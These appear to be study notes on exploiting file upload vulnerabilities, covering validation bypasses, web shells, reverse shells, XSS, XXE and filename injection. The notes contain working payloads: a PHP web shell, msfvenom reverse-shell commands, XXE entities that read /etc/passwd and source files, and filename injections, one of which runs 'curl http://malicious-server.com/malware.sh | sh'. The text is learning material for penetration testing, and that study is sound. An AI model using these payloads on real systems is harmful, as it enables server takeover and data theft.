# File Upload Vulnerability Notes

## External Links That Are Helpful
https://www.php.net/manual/en/wrappers.php

## Arbitrary File Upload Methology

1. Check for `web server's language`
   - Can use `wappalyzer` browser extension
   - Fuzz index`.ext`
2. Check and bypass `client-side validation`
   - Inspect `web page`
   - Intercept requests with `burp suite` and change `filename` and `file data`
3. Check and bypass `blacklists`
   - Fuzz working web server's language extensions
     - Utilize working web server's language extensions. Some indications can be a different error message that gets outputted from the error messages from the extensions you know for sure are blacklisted.
> TIP: before starting to fuzz with burp intruder, make sure to uncheck url encoding

4. Check and bypass `whitelists` (and blacklists if applicable)
   - `double extension` like test.jpg.php
   - ` reverse double extension` like test.php.jpg (`relies on server misconfiguration`)
   - character injection (`i.e. null byte`)
5. Check and bypass `content checks`
   - `Content-type` fuzzing for accepted content type values
   - Manipulating file MIME values by adding mnemonic values as plain text to the start of the data body or file
   
## Key Concepts on File Upload Vulnerabilities

### 1. **Absent Validation**
   - Web applications may allow uploads without validation filters.
   - Vulnerable applications allow uploading any file type, including potentially malicious files like web shells or reverse shells.
   - Uploading and executing these scripts may provide full control over the server.

### 2. **Arbitrary File Upload**
   - Web apps may allow uploading any file, without specifying restrictions on file types (e.g., `.php` files).
   - The file selector dialog may show "All Files," indicating no restrictions are enforced on the frontend.
   - If backend validation is absent, it may allow arbitrary file types to be uploaded, leading to potential server exploitation.

### 3. **Identifying Web Framework**
   - To exploit arbitrary file upload, we need to know the server's scripting language.
   - **Web Shell** and **Reverse Shell** scripts require knowing the language of the web server (e.g., PHP, ASP).
   - The **file extension** in URLs can provide clues (e.g., `.php` might indicate PHP backend), though sometimes file extensions may be hidden due to `web routes`
> Web routes are instructions in a web application that map specific URLs to corresponding actions or pages, determining what content or functionality is shown when a user visits a particular address.

   - Testing common web extensions (e.g., `/index.php`) can help identify the technology.
   - Tools like **Burp Intruder** can automate this process by fuzzing extensions.
   - `Wappalyzer` browser extension helps identify the technologies in use on the site.

### 4. **Vulnerability Identification**
   - Once the backend language is identified, you can upload a file in the same language (e.g., a PHP script).
   - Testing with a basic PHP script like `<?php echo "Hello HTB"; ?>` helps confirm if the uploaded file can execute PHP code.
   - If the file is successfully uploaded and executed, the server is vulnerable to file upload exploitation.
   - Example test: Upload `test.php` and access the uploaded file. If the PHP code is executed, the server is vulnerable.

### 5. **Exploiting the Vulnerability**
   - After confirming file upload vulnerability, the next step is to exploit it for remote control of the server by uploading a malicious script.

## Exploitation Techniques

### Web Shells
   - Web shells are scripts that provide a way to interact with the backend server.
   - Examples include **phpbash**, a terminal-like PHP web shell, and others available in **SecLists**.
   - Upload the web shell through the vulnerable upload feature and access it via its link:
     ```
     http://SERVER_IP:PORT/uploads/phpbash.php
     ```
   - Custom Web Shell Example:
     ```php
     <?php system($_REQUEST['cmd']); ?>
     ```
     - Use the `?cmd=` parameter to execute commands (e.g., `?cmd=id`).
     - For browsers, use source-view (`Ctrl+U`) for better output formatting.

### Reverse Shells
   - Reverse shells allow the server to connect back to the attacker's machine, providing interactive control.
   - Tools like **pentestmonkey PHP reverse shell** or scripts from **SecLists** can be used.
   - Edit the script with your IP/PORT:
     ```php
     $ip = 'OUR_IP';     // CHANGE THIS
     $port = OUR_PORT;   // CHANGE THIS
     ```
   - Start a Netcat listener:
     ```
     nc -lvnp OUR_PORT
     ```
   - Upload the script and execute it via the web app:
     ```
     http://SERVER_IP:PORT/uploads/reverse.php
     ```
   - Example reverse shell generation with `msfvenom`:
     ```
     msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
     ```

### Writing Custom Scripts
   - Custom scripts can be written in the web server's language using native functions like `system()` in PHP or `eval()` in ASP.NET.
   - Use `msfvenom` for generating scripts for various languages:
     ```
     msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > shell.ext
     ```

## Tools Overview

### Pentestmonkey
   - **What It Is**: A collection of tools and scripts designed for penetration testing, including reliable reverse shells.
   - **Key Usage**:
     - Edit `php-reverse-shell.php` to include your IP and port.
     - Upload to the vulnerable server and access its link to gain shell access.

### Msfvenom
   - **What It Is**: A Metasploit tool used to generate payloads, including reverse and bind shells, for various platforms and languages.
   - **Key Usage**:
     - Syntax:
       ```
       msfvenom -p payload LHOST=OUR_IP LPORT=OUR_PORT -f format > outputfile
       ```
     - Example for PHP:
       ```
       msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw > reverse.php
       ```
     - Payloads and formats:
       - `-p`: Specify the payload (e.g., `php/reverse_php`).
       - `-f`: Format (e.g., `raw`, `exe`, `elf`).

## Client-Side Validation

### 1. **Overview**
Many web applications rely on front-end JavaScript for file format validation. This validation prevents files that do not meet specified criteria (e.g., non-image formats) from being uploaded. However, since these validations occur on the client-side, they can be bypassed by:

- Modifying the upload request directly to interact with the server, skipping validation.
- Editing the front-end code via browser developer tools to disable or modify validations.

### 2. **Back-End Request Modification**
#### Steps to Bypass Validation:
1. **Examine the Request**: Capture an image upload request using Burp Suite.
2. **Modify the Request**:
   - Change `filename="HTB.png"` to `filename="shell.php"`.
   - Replace the file content with a PHP web shell.
3. **Send the Modified Request**:
   - Ensure that the server does not perform back-end validation.
   - If successful, the file will upload, and you can access the web shell.

#### Key Points:
- The `Content-Type` header may not require modification.
- A successful upload typically results in a confirmation message like "File successfully uploaded."

### 3. **Disabling Front-End Validation**
#### Using Browser Developer Tools:
1. **Inspect the File Input**:
   - Use [CTRL+SHIFT+C] to toggle the Page Inspector.
   - Locate the `<input>` tag for file uploads, e.g.:
     ```html
     <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
     ```
2. **Analyze the Validation Function**:
   - Identify the `onchange="checkFile(this)"` attribute.
   - Use the browser console ([CTRL+SHIFT+K]) to inspect the `checkFile` function:
     ```javascript
     function checkFile(File) {
         if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
             $('#error_message').text("Only images are allowed!");
             File.form.reset();
             $("#submit").attr("disabled", true);
         }
     }
     ```
   - Note how the function restricts file extensions.

3. **Bypass the Validation**:
   - Remove the `onchange="checkFile(this)"` attribute:
     - Double-click the function name in the inspector and delete it.
   - Optionally, remove `accept=".jpg,.jpeg,.png"` to allow easier file selection.

4. **Upload the Web Shell**:
   - Select the PHP web shell using the file input dialog.
   - Submit the form; the client-side validation is bypassed.

#### Important Notes:
- These modifications are temporary and will not persist through a page refresh.
- The primary goal is to bypass the validation to upload a malicious file.

### 4. **Locating and Accessing the Uploaded File**
Once the web shell is uploaded, inspect the profile image URL to locate the file:
```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

## **Blacklisting Extensions**
   - Back-end validation using a blacklist is a weak approach for file type validation as it is often incomplete and can be bypassed.
   - Example of a blacklist implementation in PHP:
     ```php
     $fileName = basename($_FILES["uploadFile"]["name"]);
     $extension = pathinfo($fileName, PATHINFO_EXTENSION);
     $blacklist = array('php', 'php7', 'phps');

     if (in_array($extension, $blacklist)) {
         echo "File type not allowed";
         die();
     }
     ```
   - Common issues with blacklist-based validation:
     - Case sensitivity: A file named `pHp` might bypass the blacklist on Windows servers due to case insensitivity.
     - Limited scope: Many extensions (e.g., `.phtml`) that can execute PHP are not included in the blacklist.

## **Fuzzing Extensions**
   - Fuzzing can identify allowed extensions by testing multiple file extensions to determine which are not blacklisted.
   - Tools and resources:
     - Use extension lists from **PayloadsAllTheThings** or **SecLists**.
     - Burp Suite Intruder can automate extension fuzzing:
       1. Send a file upload request to Intruder.
       2. Set the file extension (e.g., `.php`) as the fuzzing position.
       3. Load the PHP extensions list as payloads.
       4. Analyze responses for successful uploads (e.g., "File successfully uploaded").

## **Non-Blacklisted Extensions**
   - Some extensions like `.phtml` may not be blacklisted and could allow PHP code execution.
   - Steps to exploit:
     1. Upload a file with a non-blacklisted extension (e.g., `shell.phtml`).
     2. Include PHP code, such as a web shell, in the file content.
     3. Access the uploaded file (e.g., `http://SERVER_IP/profile_images/shell.phtml`) and confirm its execution by testing a command.
> `TIP:` When fuzzing the extensions in Burp Intruder, you can also change the the POST request data to include something like a hello word command in php and you can check which php extensions
> are able to run this command. `Also`, you should consider switching off URL encoding before the Intruder attack so all the extensions get sent "as is"!


## Whitelist Filters

**Whitelist vs Blacklist:**
   - **Whitelist**: More secure; only allows specified file extensions.
   - **Blacklist**: Allows wide variety but blocks known harmful extensions; useful in more flexible upload systems.
   - Both can be used together depending on use case.

**Whitelisting Extensions:**
   - Example code uses regex to validate allowed extensions (e.g., `.jpg`, `.jpeg`).
   - Common mistake: regex may check if the extension *contains* certain extensions rather than ensuring it *ends* with them.
   - **Attack method**: Double extensions (e.g., `shell.jpg.php`) can bypass simple regex checks.

**Double Extensions Attack:**
   - If the system only checks for the presence of an extension, attackers can append valid extensions (e.g., `.jpg.php`) to pass the whitelist test while uploading malicious files.
   - **Example**: `shell.jpg.php` may be uploaded, and PHP code will execute.

**Reverse Double Extension Attack:**
   - Misconfigurations in server (e.g., Apache2) might allow files like `shell.php.jpg` to execute PHP code, despite the whitelist.
   - **Example**: Apache regex configuration could be too lenient (`<FilesMatch ".+\.ph(ar|p|tml)">`), allowing files that contain `.php` but end with `.jpg` to still execute PHP.

**Character Injection:**
   - **Injection methods**: Inject special characters to bypass validation:
     - `%20`, `%00`, `%0a`, `%0d0a`, `/`, `.\`, `.`, `…`, `:`
   - **Effect**: Tricking server to misinterpret the filename, allowing PHP code execution.
   - Example: `shell.php%00.jpg` works on older PHP versions.
   - **Fuzzing tool**: Generate permutations of filenames with injected characters to find valid uploads.
**Custom Wordlist Generation for Fuzzing:**
   - Use a bash script to create filename permutations with injected characters to test against upload forms.
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Here is the revised list, including examples of how each character injection can be used to bypass file upload whitelist validation:

### Character Injection List for File Upload Bypass:

| Character Injection | Description                                       | Example File Name (based on the script) | Use Case |
|---------------------|---------------------------------------------------|----------------------------------------|----------|
| **%20 (space)**     | URL encoding for a space character                | `shell%20.php.jpg`                     | Bypasses filters that don't account for spaces in file names, allowing PHP files to pass as valid extensions. |
| **%0a (newline, LF)**| URL encoding for a newline character (Line Feed)  | `shell%0a.php.jpg`                     | Injects a newline into the file name, which may bypass filters or cause unintended parsing behavior. |
| **%00 (null byte)** | URL encoding for a null byte (end of string)      | `shell%00.php.jpg`                     | Terminates the string early, causing filters to incorrectly stop checking after the null byte, potentially bypassing file type checks. |
| **%0d0a (CRLF)**    | URL encoding for carriage return + newline (CRLF)| `shell%0d0a.php.jpg`                   | CRLF can be used for header injection or bypassing filters that only check the file extension, potentially leading to security vulnerabilities. |
| **/ (slash)**       | Directory separator (path traversal)              | `shell/.php.jpg`                       | Can be used for path manipulation, allowing files to be uploaded outside the intended directory. |
| **.\\ (relative path on Windows)**| Windows-specific relative path                | `shell.\php.jpg`                       | Windows uses `.\\` to reference directories, which could bypass directory restrictions by allowing files to be uploaded outside the allowed folder. |
| **. (dot - current directory)**| Refers to the current directory                | `shell./php.jpg`                       | Uses `.` to reference the current directory, potentially bypassing checks that only allow uploads within a certain folder. |
| **… (ellipsis)**    | Used as an ellipsis character, often overlooked by filters | `shell…php.jpg`                      | Bypasses filters that don't account for the ellipsis character, allowing files with unusual names to bypass validation. |
| **: (colon)**       | Special character used in Windows paths           | `shell:php.jpg`                        | In Windows, `:` is part of file paths (e.g., `C:`). Some filters may not properly handle this character, allowing bypasses. |

Here's a breakdown of how each character injection can bypass a **whitelist filter** in a file upload scenario:

#### 1. **`%20 (space)`**:
- **Problem**: Whitelist filters typically check for file extensions like `.jpg`, `.php`, `.png`, etc. However, they might not account for spaces in the filename.
- **Bypass**: If the filter doesn’t properly handle encoded spaces (`%20`), an attacker could upload files like `shell%20.php.jpg` instead of `shell.php`, which would bypass the check for `.php` files because the space is URL-encoded.
  
**Example**:  
- Filename: `shell%20.php.jpg`
- **Effect**: The filter may only check extensions (e.g., `.jpg`), missing the actual PHP extension because the space is encoded.

---

#### 2. **`%0a (newline, LF)`**:
- **Problem**: Newline characters may be overlooked by some filters, or filters might not properly validate the file name when it contains a newline character.
- **Bypass**: The `%0a` (newline) character can split the file name, potentially confusing the filter and allowing it to bypass the extension check.
  
**Example**:  
- Filename: `shell%0a.php.jpg`
- **Effect**: The filter might read `shell` as the filename and `.jpg` as the extension, incorrectly allowing it through the whitelist.

---

#### 3. **`%00 (null byte)`**:
- **Problem**: A null byte (`%00`) is a special character that terminates strings in many programming languages (e.g., C, PHP).
- **Bypass**: If the filter is implemented poorly and stops processing the file name when it encounters the null byte, it may incorrectly stop checking for the `.php` extension. This effectively bypasses file extension validation.
  
**Example**:  
- Filename: `shell%00.php.jpg`
- **Effect**: The filter might stop reading after the `%00` and mistakenly treat `shell` as the file name, allowing a PHP file to be uploaded.

---

#### 4. **`%0d0a (CRLF)`**:
- **Problem**: CRLF (`%0d0a`) characters are used in HTTP headers to separate lines. Some filters may improperly handle CRLFs in the filename or URL.
- **Bypass**: The CRLF injection could cause the filter to treat the file name as malformed or split the file name and extension across the CRLF, bypassing the extension check.
  
**Example**:  
- Filename: `shell%0d0a.php.jpg`
- **Effect**: The filter could misinterpret `shell%0d0a.php` as a valid file and ignore `.jpg` or vice versa.

---

#### 5. **`/ (slash)`**:
- **Problem**: Some filters might only check for the file extension and not consider path manipulation.
- **Bypass**: The slash (`/`) can be used for **path traversal**. By including it, attackers can trick the filter into allowing files with unexpected paths or extensions.
  
**Example**:  
- Filename: `shell/.php.jpg`
- **Effect**: The filter might ignore the `/` and treat `.php` as the extension, allowing a PHP file to be uploaded as a `.jpg` file.

---

#### 6. **`.\\ (relative path on Windows)`**:
- **Problem**: Some filters might not handle relative path notation properly on Windows.
- **Bypass**: The `.\\` sequence refers to the current directory in Windows file systems, allowing attackers to upload files outside the intended directory. If the filter doesn’t sanitize input correctly, it might allow these relative paths.
  
**Example**:  
- Filename: `shell.\php.jpg`
- **Effect**: The filter might misinterpret the path and allow the PHP file to be uploaded, bypassing the `.php` check.

---

#### 7. **`. (dot - current directory)`**:
- **Problem**: The dot (`.`) represents the current directory. Filters that only check extensions might miss this manipulation.
- **Bypass**: If an attacker includes `.` in the file name, it could potentially trick the filter into thinking the file is safe, despite having a malicious extension like `.php`.
  
**Example**:  
- Filename: `shell./php.jpg`
- **Effect**: The filter might incorrectly allow the file as a `.jpg` file, but it could actually be a `.php` file, leading to an upload bypass.

---

#### 8. **`… (ellipsis)`**:
- **Problem**: The ellipsis (`…`) is not always recognized as a special character in filename validation.
- **Bypass**: Filters that don’t properly account for the ellipsis may mistakenly treat it as a regular character, allowing it to bypass validation checks based on the file extension.
  
**Example**:  
- Filename: `shell…php.jpg`
- **Effect**: The filter might ignore or misinterpret the ellipsis and allow the file to bypass the `.php` extension check, treating it as `.jpg`.

---

#### 9. **`: (colon)`**:
- **Problem**: The colon (`:`) is a special character in Windows paths. Some filters may not correctly process file names with colons.
- **Bypass**: If the filter fails to handle the colon properly, it could allow files with colons to be uploaded, potentially bypassing checks for dangerous file types.
  
**Example**:  
- Filename: `shell:php.jpg`
- **Effect**: The filter might treat the file name as valid despite the colon, allowing it to pass as a `.jpg` file when it could be a `.php` file.

---

## Type Filters
In the previous sections, we were dealing with web applications that only validate for the `file extension` in the file name. However, this is not very secure. Many modern web applications are now incorporating `file content validation` to ensure the content of the loaded file matches with the specific type. There are two common methods for validating file content:  
1. `Content-Type Header`
2. `File Content`

---

### Content Type
**Scenario:** You try to upload a `.php` file and get an `Only images are allowed` error message. The error message persists, and our file fails to upload even if you utilize some of the tricks like `double extensions`. But the error message also persists when you use `test.jpg` with a `web shell content`. Because the file extension does not affect the error message, the web application must be testing the file content for `type validation`. Web application can test the `content-type` http header like: 

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
Browsers automatically set the content-type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since our browser sets this, this operation is a `client-side operation`, and we can manipulate this to change the perceived file type and potentially bypass the `type filter`
> Now that you know this, you can fuzz the Content-Type header using a Content-Type wordlist (like from Seclists) through Burp Intruder to see which types are allowed. 
> Because the error message tells you that only images are allowed, you can limit the scan to image types, so you do not have run a long intruder attack.

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

> The `wget` command in Bash is a non-interactive network downloader used to fetch files from the web using HTTP, HTTPS, or FTP protocols.

1. **Download a file**:  
   `wget http://example.com/file.txt`

2. **Download multiple files**:  
   `wget -i urls.txt` (where `urls.txt` contains a list of URLs)

3. **Resume a partially downloaded file**:  
   `wget -c http://example.com/largefile.zip`

4. **Download an entire website**:  
   `wget --mirror -p --convert-links -P ./localdir http://example.com`

5. **Limit download speed**:  
   `wget --limit-rate=200k http://example.com/file.zip`
   
---

### MIME-Type
`MIME-Type` = `Multipurpose Internet Mail Extensions` is an internet standard that determines the type of a file through its `general format` and `bytes structure`. This is usally done by inspecting the `first few bytes` of a file's content, which contain the `File Signature` or `Magic Bytes`. For example, if a file starts with (GIF87a or GIF89a), this indicates that it is a `GIF` file, while a file starting with plaintext is considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.  

#### Basic Example
The `file` command on `Unix` systems finds the file type through the `MIME` type. If we create a basic file with text in it, it would be considered a text file. 

```bash
echo "this is a text file" > text.jpg
file text.jpg

OUTPUT: text.jpg: ASCII text
```
The file's MIME type is `ASCII text,` even though its extension is `.jpg`. However, if we write GIF8 to the beginning of the file, it will be considered as a `GIF` image instead, even though the extension is still .jpg: 

```bash
echo "GIF8" > text.jpg
file text.jpg

OUTPUT: text.jpg: GIF image data
```
> TIP: the GIF8 is plaintext that can be placed at the beginning of the file data. You can also manipulate it through changing the actual bytes to the signature version of mnemonic. You can do this within Burp. 

## Limited File Uploads (Non-arbitrary)

We may come across web applications that have `limited` (i.e., `non-arbitrary`) file upload forms, which only allows us to upload specific file types. Certain file types like `SVG, HTML, XML` and even some `image and document files` may allow us to introduce new vulnerabilities to the web application by uploading `malicious versions` of these files. This is precisely why fuzzing for `allowed file extensions` is an important part of the overall methology for `file upload vulnerability attacks.`

### XSS 
Many file types may allow us to introduce a `stored XSS` vulnerability to the web application by uploading maliciously crafted versions of the files. For instance, when a web application allows us to upload `HTML` files, although HTML files won't allow us to execute code (PHP), it would still be possible to implement `malicious javascript` code within them to carry an `XSS` or `CSRF` attack on whoever visits the uploaded HTML page.  

---

Another example of XSS attacks is web applications that display an `image's metadata` after its upload. This can be seen in web applications like `Flickr` or `Instagram` because these web applications may show details about the uploaded photo, such as the camera model or location. For such web applications, we can include an XSS payload in one of the Metadata's parameters that accepts raw text, like the `comment` or `artist` parameter: 

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' example.jpg
exiftool example.jpg

OUTPUTS: "><img src=1 onerror=alert(window.origin)>
```

> exiftool is a command-line utility for reading and modifying metadata in files, especially images. It supports many formats such as JPEG, PNG, and TIFF

Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed. 

---

XSS attacks can also be carried with `SVG` images, along with other attacks. `SVG` images are `XML-based`, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can `modify` their `XML data` to include an `XSS payload`. For example, we can write the following to `example.jpg`: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
> TIP: Unlike typical image formats like JPEG or PNG, an SVG is text-based, meaning it contains code that tells the browser how to render the image.

An example of an SVG file: 

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <circle cx="50" cy="50" r="40" fill="red" />
</svg>

```

### XXE 

#### What are XXE Attacks? 
An `XXE (XML External Entity` attack exploits vulnerabilities in applications that parse XML input. It takes advantage of the ability of XML parsers to process `external entities`, which can allow attackers to access `sensitive files`, perform `denial of service (DoS)`, or even `remote code execution`. 
#### How does XXE Work? 
1. **What are External Entities**
   - XML allows defining `custom` entities to include external resources like files or URLs.
   - Example:
     ```xml
     <!DOCTYPE note [
        <!ENTITY example SYSTEM "file:///etc/passwd">
      ]>
      <note>
        <to>&example;</to>
      </note>
     ```
   - `&example;` is replaced with the contents of the file `etc/passwd`

---

Because `SVG` images are `XML-based`, we can also include malicious XML data/code to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of `/etc/passwd`: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Furthermore, you can even read source code using the following payload in our SVG image: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Let's break this down part by part: 
1. **Line 1**: `<?xml version="1.0" encoding="UTF-8"?>`
   - This is an `xml declaration`
   - It defines the version of XML being used and the character encoding for the file
2. **Line 2**: `<!DOCTYPE svg [ ... ]>`
   - This line defines the `Document Type Definition` (DTD) and declares an `entity`
   - DTDs are used to define the structure and allowed elements for an XML document. In this case, it's defining custom rules for the `svg` file.
3. **Line 2 Part 2**: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">`
   - `ENTITY xxe`: Declares a new XML entity named xxe. Entities in XML can be used to include data in the document by referencing them, much like how variables work in programming languages
   - `SYSTEM`: This tells the XML parser that the entity will reference an `external resrouce` as opposed to an internal value
   - `"php://filter/convert.base64-encode/resource=index.php"`
     * `php://`: a special`PHP stream wrapper`. It tells PHP to treat the following part as a "stream" (a way to access data, like a file or resource). Just a way to incorporate PHP functionality into your code. 
     * `filter/`: Tells php that you want to `apply a filter` to the stream (modify or process the data in some way
     * `convert.base64-encode`: The actual filter
     * `resource=index.php`: Specifies the **file/resource** you want to apply the filters to.
     
> TIP 1: Why encode it base64? it makes it easy to send binary data (like the contents of a php file) through text based systems like XML without causing issues (since XML only likes plain-text)

> TIP 2: The attack should work the same way whether the DOCTYPE is svg or note etc., as the core issue is how the XML parser handles external entities. The only difference is the context or intended structure of the XML document (i.e., an SVG graphic versus a "note" document

It's important to note that using `XML data` is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `Powerpoint Documents`, among many others. All of these documents include XML data within them to specify their format and structure. Suppose a web app has a document viewer that is vulnerable to XXE and allowed uploading any of these documents. In that case, we can modify their XML data to include malicious XXE elements, and we would be able to carry out a blind XXE attack on the backend server. 

---

#### Extra Notes

1. **Internal**: Rules or entities are **inside the XML file** itself (in `<!DOCTYPE>` with `[...]`).  
   Example:  
   ```xml
   <!DOCTYPE note [ <!ENTITY myNote "Hello!"> ]>
   <note>&myNote;</note>
   ```

2. **External**: Rules or entities are in a **separate file**, and the XML file refers to it using `SYSTEM` or `PUBLIC`.  
   Example:  
   ```xml
   <!DOCTYPE note SYSTEM "Note.dtd">
   <note>...</note>
   ```
   The XML file looks in `Note.dtd` for the rules.

My previous example:
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
- Uses **internal rules** (`[...]`) but points to an **external file** (`file:///etc/passwd`). It’s a mix!

---

- `<!DOCTYPE>` specifies the type of the document (e.g., `svg`, `note`), telling the XML parser what kind of structure to expect.
- Inside the `<!DOCTYPE>`, you can define rules, entities, or references (like variables or external files) that the document follows.

### DoS (Denial of Service 

Many file upload vulnerabilities may lead to Denial of Service (DOS) attack on the web server. A `DoS` attack occurs when an attacker overwhelms or crashes a web server, making it unavailable to legitimate users. In the context of file upload vulnerabilities, attackers exploit weaknesses in the server's handling of uploaded files to cause `resource exhaustion` or `crashes`. 


### **Types of DoS Attacks via File Uploads**

##### **Using XXE Payloads for DoS**
- **How it works:** Exploiting XML External Entity (XXE) vulnerabilities can lead to DoS attacks. For example, an attacker might repeatedly reference external files or entities in XML data, causing the server to overload or crash.
- **Example:** Using an XML document with numerous nested external entities to consume server resources.


##### **Decompression Bomb (ZIP Bomb)**
- **What is it?** A malicious compressed file designed to expand into an enormous amount of data when decompressed.
- **Attack Method:**
  - Create a ZIP file containing **nested compressed files**. Each nested archive, when extracted, contains further compressed files.
  - For instance, a single ZIP file could decompress to **petabytes (PB)** of data, overwhelming server storage or memory.
- **Key Vulnerability:** If the web app **automatically unzips files** upon upload, this can crash the server.


##### **Pixel Flood Attack (Image DoS)**
- **What is it?** A maliciously crafted image file with manipulated compression data.
- **Attack Method:**
  - Start with a valid image (e.g., JPG, PNG) of a small size (e.g., 500x500 pixels).
  - Modify the **metadata** to claim an enormous image size (e.g., `0xffff x 0xffff` pixels = 4 gigapixels).
  - When the server tries to display or process the image, it **allocates excessive memory** based on the fake metadata, leading to a crash.
- **Key Vulnerability:** Applications that handle image compression without validating metadata.


##### **Uploading Overly Large Files**
- **How it works:**
  - Exploit upload forms that **do not limit file size**.
  - Upload excessively large files to fill up the server’s **hard drive** or **memory**, causing the server to slow down or crash.
- **Impact:** Resource exhaustion leads to server unavailability.


##### **Directory Traversal**
- **What is it?**
  - Using file paths like `../../../etc/passwd` to upload files to unintended directories on the server.
- **Attack Method:**
  - If the server does not properly validate file paths, the attacker might overwrite critical files or write files in unauthorized directories.
  - This can cause system instability or crashes.

### exiftool 

#### What is ExifTool?
`ExifTool` is a command-line utility and library for reading, writing, and editing metadata in files, especially in images, videos, and documents. It supports many formats including `JPEG`, `PNG`, `PDF`, and `MP4`. 

### How is this useful in file upload attacks? 
ExifTool is sueful for file upload attacks because it allows you to `manipulate image metadata`, which some web apps extract and use unsafely. Here's how attackers use it: 
* **XSS Injection in Metadata**
  * If an app displays `metadata` (like `Comment` or `Description`) without sanitization, you can inject Javascript:
    ```bash
      exiftool -Comment='"><script>alert(1)</script>' image.jpg
    ```
  * When uploaded, if the app displays the `Comment` in an unsantizied <img> tag, it triggers the XSS.
* **Web Shell in Metadata**
  * Some applications `parse metadata` and log it without sanitization.
  * Injecting `PHP or shell payloads` into metadata can be dangerous if the app executes metadata in any way
    ```bash
      exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
    ```
  * If the app stores logs or executes metadata, this can lead to `Remote Code Execution`
* **Malicious File Extension Spoofing**
  * ExifTool can `modify file extensions` inside metadata, tricking some security filters
  * Example: Change metadata to make an executable look like an image:
    ```bash
      exiftool -FileType=JPEG -MIMEType=image/jpeg malicious.exe
    ```

### How do I know the current metadata of an image? 
You can check the existing metadata of an image using ExifTool with the following command: 

```bash
exiftool image.jpg
```

### **File Name and Command Injection**
File names can sometimes be used in server-side operations such as moving, renaming, or processing files. If an attacker can control the file name, they might inject commands that the server might execute, leading to serious security issues.

#### **Example: Command Injection via File Name**
Suppose a web application allows users to upload files and then uses an **OS command** to move the uploaded file to a different directory. If the file name is not sanitized and is directly used in the command, attackers can inject arbitrary commands.

For example, imagine the server uses a command like this to move the uploaded file:
```bash
mv file /tmp
```
Now, if the attacker names the file as:
- `file$(whoami).jpg`
- `file\`whoami\`.jpg`
- `file.jpg||whoami`

These filenames contain **injected commands** (like `$(whoami)` or backticks with `whoami`), which are a common way to run OS commands on Unix-like systems.

When the server executes the **mv** command, it might mistakenly treat the injected part of the file name as an OS command, and execute it. The result would be the attacker gaining information about the current user or running arbitrary commands on the server.

For example:
- `file$(whoami).jpg` could result in:
  ```bash
  mv file$(whoami).jpg /tmp
  ```
  If executed, this could run the `whoami` command, and the server might output something like `root` if the server is running with root privileges, which gives the attacker useful information.

#### **How this leads to RCE**:
If the attacker can inject more dangerous commands like:
- `file.jpg; rm -rf /` or
- `file.jpg && curl http://malicious-server.com/malware.sh | sh`

Then they can execute commands that might lead to **Remote Code Execution (RCE)** on the server.

---

#### **File Name and XSS (Cross-Site Scripting)**
If the application reflects the file name back to the user without sanitizing it, attackers can inject **JavaScript payloads** into the file name. This can lead to **XSS attacks** if the file name is displayed in an HTML page, like in an image caption or a link.

##### **Example: XSS via File Name**
Suppose the application displays the file name after uploading, such as:
```html
<p>File uploaded: file.jpg</p>
```
If the attacker uploads a file with a malicious name like:
- `file.jpg<script>alert(window.origin);</script>`

This would result in:
```html
<p>File uploaded: file.jpg<script>alert(window.origin);</script></p>
```
When the page is rendered, the script gets executed, and the attacker can execute arbitrary JavaScript on the victim's browser.

##### **How this can be dangerous**:
XSS can allow an attacker to steal session cookies, redirect the user to a malicious website, or perform other malicious actions in the context of the victim's session.

---

#### **File Name and SQL Injection**
Sometimes, the file name is used directly in **SQL queries** without proper sanitization. If the file name is inserted into an SQL query, an attacker might inject malicious SQL commands, potentially leading to **SQL injection** vulnerabilities.

##### **Example: SQL Injection via File Name**
If the application uses the file name in an SQL query to log file uploads or process them, and the file name is not sanitized, an attacker can inject SQL statements.

For instance, if the file name is inserted into a query like this:
```sql
SELECT * FROM files WHERE filename = 'uploaded_file_name';
```
An attacker might upload a file with a name like:
- `file';select+sleep(5);--.jpg`

The resulting SQL query would look like:
```sql
